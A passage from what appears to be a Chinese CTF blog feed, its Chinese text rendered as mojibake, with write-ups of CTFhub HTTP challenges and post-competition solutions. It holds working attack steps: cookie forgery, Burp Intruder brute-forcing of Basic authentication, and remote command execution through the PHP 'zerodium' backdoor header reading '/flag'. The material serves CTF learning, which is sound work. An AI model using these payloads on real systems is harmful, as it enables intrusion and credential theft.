title="å“åº”æŠ¥æ–‡å±æ€§"></a>å“åº”æŠ¥æ–‡å±æ€§</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml">Ageï¼š(ä»æœ€åˆåˆ›å»ºå¼€å§‹)å“åº”æŒç»­æ—¶é—´<br><br>Publicï¼šæœåŠ¡å™¨ä¸ºå…¶èµ„æºæ”¯æŒçš„è¯·æ±‚æ–¹æ³•åˆ—è¡¨<br><br>Retry-Afterï¼šå¦‚æœèµ„æºä¸å¯ç”¨çš„è¯ï¼Œåœ¨æ­¤æ—¥æœŸæˆ–æ—¶é—´é‡è¯•<br><br>Serverï¼šæœåŠ¡å™¨åº”ç”¨ç¨‹åºè½¯ä»¶çš„åç§°å’Œç‰ˆæœ¬<br><br>Titleï¼šå¯¹HTMLæ–‡æ¡£æ¥è¯´ï¼Œå°±æ˜¯HTMLæ–‡æ¡£çš„æºç«¯ç»™å‡ºçš„æ ‡é¢˜<br><br>Warningï¼šæ¯”åŸå› çŸ­è¯­æ›´è¯¦ç»†ä¸€äº›çš„è­¦å‘ŠæŠ¥æ–‡<br><br>ETagï¼šä¸€ä¸ªä»£è¡¨å“åº”æœåŠ¡ç«¯èµ„æºï¼ˆå¦‚é¡µé¢ï¼‰ç‰ˆæœ¬çš„æŠ¥æ–‡å¤´å±æ€§ï¼Œå¦‚æœæŸä¸ªæœåŠ¡ç«¯èµ„æºå‘ç”Ÿå˜åŒ–äº†ï¼Œè¿™ä¸ªETagå°±ä¼šç›¸åº”å‘ç”Ÿå˜åŒ–ã€‚<br><br>Accept-Rangesï¼šå¯¹æ­¤èµ„æºæ¥è¯´ï¼ŒæœåŠ¡å™¨å¯æ¥å—çš„èŒƒå›´ç±»å‹<br><br>Varyï¼šæœåŠ¡å™¨ä¼šæ ¹æ®è¿™äº›é¦–éƒ¨çš„å†…å®¹æŒ‘é€‰å‡ºæœ€é€‚åˆçš„èµ„æºç‰ˆæœ¬å‘é€ç»™å®¢æˆ·ç«¯<br><br>Proxy-Authenticateï¼šæ¥è‡ªä»£ç†çš„å¯¹å®¢æˆ·ç«¯çš„è´¨è¯¢åˆ—è¡¨<br><br>Set-Cookieï¼šæœåŠ¡ç«¯å¯ä»¥è®¾ç½®å®¢æˆ·ç«¯çš„Cookieï¼Œä»¥ä¾¿æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯è¿›è¡Œæ ‡è¯†ã€‚<br><br>Set-Cookie2ï¼šä¸Set-Cookieç±»ä¼¼<br><br>WWW-Authenticateï¼šæ¥è‡ªæœåŠ¡å™¨çš„å¯¹å®¢æˆ·ç«¯çš„è´¨è¯¢åˆ—è¡¨<br><br></code></pre></td></tr></table></figure><h1 id="HTTPåè®®å®æˆ˜ç»ƒä¹ "><a href="#HTTPåè®®å®æˆ˜ç»ƒä¹ " class="headerlink" title="HTTPåè®®å®æˆ˜ç»ƒä¹ "></a>HTTPåè®®å®æˆ˜ç»ƒä¹ </h1><p>é¢˜ç›®æ¥è‡ªCTFhubé¶åœºï¼šWebå‰ç½®æŠ€èƒ½-HTTPåè®®</p><h2 id="è¯·æ±‚æ–¹å¼"><a href="#è¯·æ±‚æ–¹å¼" class="headerlink" title="è¯·æ±‚æ–¹å¼"></a>è¯·æ±‚æ–¹å¼</h2><p>HTTP è¯·æ±‚æ–¹æ³•, HTTP/1.1åè®®ä¸­å…±å®šä¹‰äº†å…«ç§æ–¹æ³•ï¼ˆä¹Ÿå«åŠ¨ä½œï¼‰æ¥ä»¥ä¸åŒæ–¹å¼æ“ä½œæŒ‡å®šçš„èµ„æºã€‚</p><p><img src="https://img-blog.csdnimg.cn/20210329161254214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ–¹æ³•ä¸€ï¼š<br>burpsiteæŠ“åŒ…ï¼Œè‡ªå®šä¹‰CTFHUBæ–¹æ³•è¯·æ±‚ index.php å³å¯æ‹¿åˆ° flagã€‚<br><img src="https://img-blog.csdnimg.cn/20210329161305347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ–¹æ³•äºŒï¼š<br>ä½¿ç”¨curlå‘½ä»¤æŸ¥çœ‹æœåŠ¡å™¨çš„è¿”å›ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -v -X CTFHUB challenge-9661cba9e188a4c8.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329162918897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="302è·³è½¬"><a href="#302è·³è½¬" class="headerlink" title="302è·³è½¬"></a>302è·³è½¬</h2><p>HTTPä¸´æ—¶é‡å®šå‘<br><img src="https://img-blog.csdnimg.cn/20210329202651177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹å‡»è¶…é“¾æ¥æ— ååº”ï¼ŒæŸ¥çœ‹æºç å‘ç°äº†index.phpï¼Œè€Œæ­¤æ—¶urlæ æ˜¯index.html<br><img src="https://img-blog.csdnimg.cn/20210329202712652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>burpsiteæŠ“åŒ…ï¼Œåœ¨å“åº”åŒ…å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210329202803184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ–¹æ³•äºŒï¼š<br>curlå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i http://challenge-f6959bd27c1b2b09.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329161745105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curlå‘½ä»¤<br>https://blog.csdn.net/qq_45738111/article/details/105265455<br></code></pre></td></tr></table></figure><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookieæ¬ºéª—ã€è®¤è¯ã€ä¼ªé€ </p><p><a href="http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080/">http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080</a><br>æ–¹æ³•ä¸€ï¼š</p><p>æŠ“åŒ…ï¼Œå“åº”å¤´æç¤ºåªæœ‰adminæ‰èƒ½å¾—åˆ°flagï¼Œæ­¤æ—¶è¯·æ±‚å¤´Cookieçš„å€¼ä¸ºadmin=0<br><img src="https://img-blog.csdnimg.cn/20210329200457714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ”¹ä¸ºadmin=1ï¼Œå¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210329200506541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ–¹æ³•äºŒï¼š</p><p>å¯ä»¥ä½¿ç”¨curlå‘½ä»¤çš„â€-Hâ€å‚æ•°æ¥ä¸ºhttpè¯·æ±‚å¤´æ·»åŠ cookieé”®å€¼æ¥å‘é€cookieï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i -H <span class="hljs-string">&quot;Cookie:admin=1&quot;</span> http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080/<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329191357125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="åŸºç¡€è®¤è¯"><a href="#åŸºç¡€è®¤è¯" class="headerlink" title="åŸºç¡€è®¤è¯"></a>åŸºç¡€è®¤è¯</h2><p>åœ¨HTTPä¸­ï¼ŒåŸºæœ¬è®¤è¯ï¼ˆè‹±è¯­ï¼šBasic access authenticationï¼‰æ˜¯å…è®¸httpç”¨æˆ·ä»£ç†ï¼ˆå¦‚ï¼šç½‘é¡µæµè§ˆå™¨ï¼‰åœ¨è¯·æ±‚æ—¶ï¼Œæä¾› ç”¨æˆ·å å’Œ å¯†ç  çš„ä¸€ç§æ–¹å¼ã€‚è¯¦æƒ…è¯·æŸ¥çœ‹ <a href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81">https://zh.wikipedia.org/wiki/HTTPåŸºæœ¬è®¤è¯</a></p><p>è®¿é—®é¢˜ç›®åœ°å€<br><img src="https://img-blog.csdnimg.cn/20210329192024754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·³è½¬åˆ°ç™»é™†é¡µé¢<br><img src="https://img-blog.csdnimg.cn/2021032919204261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…ˆè¾“å…¥å¼±å¯†ç admin\123456ç™»é™†ï¼Œç„¶åæŠ“åŒ…<br><img src="https://img-blog.csdnimg.cn/20210329192830793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨è¯·æ±‚å¤´å‘ç°ä¸€æ®µbase64ç¼–ç ï¼Œè§£ç å¾—åˆ°<code>admin:123456</code>ï¼Œè€Œåœ¨å“åº”å¤´å‘ç°ä¸€æ®µè¯Do u know admin ?ï¼Œå†ç»“åˆé¢˜ç›®é™„ä»¶ä¸­ç»™çš„å­—å…¸ï¼Œæ‰€ä»¥è¯´æœ¬é¢˜åº”è¯¥æ˜¯çˆ†ç ´ç®¡ç†å‘˜å¯†ç ï¼Œä¸ä»¥å¾€çˆ†ç ´å¯†ç ä¸åŒçš„æ˜¯ï¼Œè´¦å·å’Œå¯†ç ä¸€èµ·è¢«base64åŠ å¯†äº†ã€‚</p><p>å°†è¯·æ±‚æŠ¥æ–‡å‘é€åˆ°Intruderï¼Œç‚¹å‡»Addï¼Œå°† Basic åé¢ base64 éƒ¨åˆ†æ·»åŠ ä¸º payload position<br><img src="https://img-blog.csdnimg.cn/20210329193459133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨Payload Optionsæ¨¡å—ä¸­ç‚¹å‡»loadæ·»åŠ å­—å…¸ï¼Œåœ¨Payload Processingæ¨¡å—ä¸­ç‚¹å‡»æ·»åŠ é€‰æ‹©Add prefixï¼Œå…¶å€¼ä¸º<code>admin:</code>,ç»§ç»­é€‰æ‹©encodeï¼Œå…¶å€¼ä¸ºbase64-encodeï¼Œæœ€åç‚¹å‡»Start attckå¼€å§‹çˆ†ç ´<br><img src="https://img-blog.csdnimg.cn/20210329194328455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çˆ†ç ´ç»“æœæŒ‰Lengthæ’åºï¼Œå‘ç°å€¼ä¸º<code>YWRtaW46MTIzMzIx</code>ï¼Œæ­¤æ—¶çŠ¶æ€ç ä¸º200ï¼Œè¯´æ˜æ˜¯æ­£ç¡®çš„è´¦å·å¯†ç ã€‚<br><img src="https://img-blog.csdnimg.cn/20210329194425899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>base64è§£å¯†å¾—åˆ°<code>admin:123321</code>,è¾“å…¥è´¦å·å¯†ç ç™»é™†å¾—åˆ°flagï¼Œåœ¨å“åº”å¤´ä¹Ÿèƒ½çœ‹åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210329194850620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å“åº”åŒ…æºä»£ç "><a href="#å“åº”åŒ…æºä»£ç " class="headerlink" title="å“åº”åŒ…æºä»£ç "></a>å“åº”åŒ…æºä»£ç </h2><p>HTTPå“åº”åŒ…æºä»£ç æŸ¥çœ‹</p><p>è®¿é—®é¢˜ç›®åœ°å€<br><img src="https://img-blog.csdnimg.cn/20210329195659368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŠ“åŒ…ï¼Œå‘åŒ…ï¼Œåœ¨å“åº”åŒ…æºç å‘ç°äº†flagã€‚<br><img src="https://img-blog.csdnimg.cn/20210329195714758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥æŸ¥çœ‹æºä»£ç ä¹Ÿå¯ä»¥å‘ç°flag<br><img src="https://img-blog.csdnimg.cn/20210329195946922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‚è€ƒ:<br><a href="https://baike.baidu.com/item/http/243074?fromtitle=HTTP">ç™¾åº¦ç™¾ç§‘-HTTPåè®®</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åè®®åŸºç¡€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è™ç¬¦+çº¢æ˜è°·+ctfshowæ¸”äººæ¯èµ›åå¤ç°</title>
    <link href="/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šè®°å½•æœ€è¿‘å‡ åœºæ¯”èµ›çš„èµ›åå¤ç°</p> <a id="more"></a><h1 id="è™ç¬¦CTF"><a href="#è™ç¬¦CTF" class="headerlink" title="è™ç¬¦CTF"></a>è™ç¬¦CTF</h1><h2 id="Web-ç­¾åˆ°"><a href="#Web-ç­¾åˆ°" class="headerlink" title="Web-ç­¾åˆ°"></a>Web-ç­¾åˆ°</h2><p><img src="https://img-blog.csdnimg.cn/20210404100847899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‚è€ƒ<a href="http://cn-sec.com/archives/313267.html">è¯¦ç»†åˆ†æPHPæºä»£ç åé—¨äº‹ä»¶åŠå…¶ä¾›åº”é“¾å®‰å…¨å¯ç¤º</a></p><p>æ ¹æ®æ–‡ç« æç¤ºï¼Œæ·»åŠ æ¶æ„è¯·æ±‚å¤´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumphpinfo();<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°phpinfoå†…å®¹<br><img src="https://img-blog.csdnimg.cn/20210404100629750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­æ„é€ ï¼ŒæŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumsystem(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404100940524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¯»å–flagæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumsystem(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404101127186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="MISC-ä½ ä¼šæ—¥å¿—åˆ†æå—"><a href="#MISC-ä½ ä¼šæ—¥å¿—åˆ†æå—" class="headerlink" title="MISC-ä½ ä¼šæ—¥å¿—åˆ†æå—"></a>MISC-ä½ ä¼šæ—¥å¿—åˆ†æå—</h2><p><img src="https://img-blog.csdnimg.cn/20210404101326722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ†ææ—¥å¿—ï¼Œè¯¥æ—¥å¿—åº”è¯¥æ˜¯ç”¨è„šæœ¬è¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼Œæœ€åä¸€æ­¥æ˜¯çˆ†flagçš„å€¼ï¼Œå‘ç°æœ‰ä¸¤ç§é•¿åº¦çš„åŒ…ï¼ŒçŒœæµ‹é•¿åº¦377ä»£è¡¨çˆ†å€¼æˆåŠŸï¼Œé•¿åº¦399ä»£è¡¨å¤±è´¥<br><img src="https://img-blog.csdnimg.cn/20210404103342703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ—å‡ºé•¿åº¦ä¸º377çš„å€¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">90 109 120 104 90 51 116 90 98 51 86 102 89 88 74 108 88 51 78 118 88 50 100 121 90 87 70 48 102 81 61 61<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è„šæœ¬è¿›è¡Œå¤„ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=[<span class="hljs-number">90</span>,<span class="hljs-number">109</span>,<span class="hljs-number">120</span>,<span class="hljs-number">104</span>,<span class="hljs-number">90</span>,<span class="hljs-number">51</span>,<span class="hljs-number">116</span>,<span class="hljs-number">90</span>,<span class="hljs-number">98</span>,<span class="hljs-number">51</span>,<span class="hljs-number">86</span>,<span class="hljs-number">102</span>,<span class="hljs-number">89</span>,<span class="hljs-number">88</span>,<span class="hljs-number">74</span>,<span class="hljs-number">108</span>,<span class="hljs-number">88</span>,<span class="hljs-number">51</span>,<span class="hljs-number">78</span>,<span class="hljs-number">118</span>,<span class="hljs-number">88</span>,<span class="hljs-number">50</span>,<span class="hljs-number">100</span>,<span class="hljs-number">121</span>,<span class="hljs-number">90</span>,<span class="hljs-number">87</span>,<span class="hljs-number">70</span>,<span class="hljs-number">48</span>,<span class="hljs-number">102</span>,<span class="hljs-number">81</span>,<span class="hljs-number">61</span>,<span class="hljs-number">61</span>]<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    flag=flag+<span class="hljs-built_in">chr</span>(i)<br>    <br>print(flag)<br>print(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==<br>b<span class="hljs-string">&#x27;flag&#123;You_are_so_great&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªä¸€ä¸ªæ‰¾é•¿åº¦ä¸º377çš„åŒ…å¤ªéº»çƒ¦äº†ï¼Œé™„ä¸Šå¤§å¸ˆå‚…çš„è„šæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">from base64 import *<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>with open(<span class="hljs-string">&#x27;access.log&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>    lines = f.readlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;select%20flag%20from%20flllag&quot;</span> <span class="hljs-keyword">in</span> line:<br>            packet_len = line[line.find(<span class="hljs-string">&#x27; 200 &#x27;</span>)+5:line.find(<span class="hljs-string">&#x27; &quot;-&quot; &quot;python-requests/2.21.0&quot;&#x27;</span>)]<br>            <span class="hljs-keyword">if</span> packet_len == <span class="hljs-string">&#x27;377&#x27;</span>:<br>                ascii_code = line[line.find(<span class="hljs-string">&#x27;))=&#x27;</span>)+3:line.find(<span class="hljs-string">&#x27;,sleep&#x27;</span>)]<br>                ascii_str = chr(int(ascii_code))<br>                flag += ascii_str<br>            <span class="hljs-keyword">else</span>:<br>                pass<br>        <span class="hljs-keyword">else</span>:<br>            pass<br><br><span class="hljs-built_in">print</span>(b64decode(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><h1 id="çº¢æ˜è°·CTF"><a href="#çº¢æ˜è°·CTF" class="headerlink" title="çº¢æ˜è°·CTF"></a>çº¢æ˜è°·CTF</h1><h2 id="Web-write-shell"><a href="#Web-write-shell" class="headerlink" title="Web-write_shell"></a>Web-write_shell</h2><p>æ²¡æŠ¥ä¸Šåï¼Œåœ¨BUUä¸Šé¢æ‰¾åˆ°çš„ç¯å¢ƒ<br><img src="https://img-blog.csdnimg.cn/20210405165110827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>çŸ¥è¯†ç‚¹ï¼šçŸ­æ ‡ç­¾ç»•è¿‡phpè¿‡æ»¤</strong></p><blockquote><p>PHPå¼€å¯çŸ­æ ‡ç­¾å³short_open_tag=onæ—¶ï¼Œå¯ä»¥ä½¿ç”¨<?=$_?>è¾“å‡ºå˜é‡</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 